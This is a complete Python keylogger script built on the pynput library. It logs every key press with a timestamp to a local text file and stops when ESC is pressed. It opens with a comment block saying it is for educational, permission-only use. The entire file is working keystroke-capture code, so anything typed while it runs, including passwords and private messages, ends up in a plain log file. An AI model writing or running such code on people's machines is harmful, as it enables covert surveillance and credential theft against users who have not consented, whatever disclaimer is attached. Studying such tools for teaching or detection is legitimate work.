from pynput import keyboard
import datetime
import time

# Ethical Considerations:
# ===========================
# This keylogger is intended for educational purposes only. 
# Always obtain explicit permission from the owner of the system 
# before monitoring or logging keystrokes. 
# Unauthorized use of keyloggers is illegal and unethical. 
# Use this code responsibly and in compliance with local laws and regulations.
#
# By running this code, you agree to use it for lawful and ethical purposes only.
# ===========================

# Create a unique log file name based on the current timestamp
log_file = f"keylog_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

# Function to write keystrokes to file with timestamp
def write_to_file(key):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a") as f:
        f.write(f"{timestamp} - {key}\n")

# Callback function for key press events
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            if key.char.isalnum() or key.char == ' ':  # Include letters, numbers, and space
                write_to_file(key.char)
        elif key == keyboard.Key.enter:
            write_to_file("[ENTER]")
        else:
            write_to_file(f'[{key}]')
    except Exception as e:
        print(f"Error: {e}")

# Stop keylogger on pressing ESC and print saved filename
def on_release(key):
    if key == keyboard.Key.esc:
        print(f"[INFO] Keylogger stopped. Log saved as {log_file}")
        return False

# Listener for keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
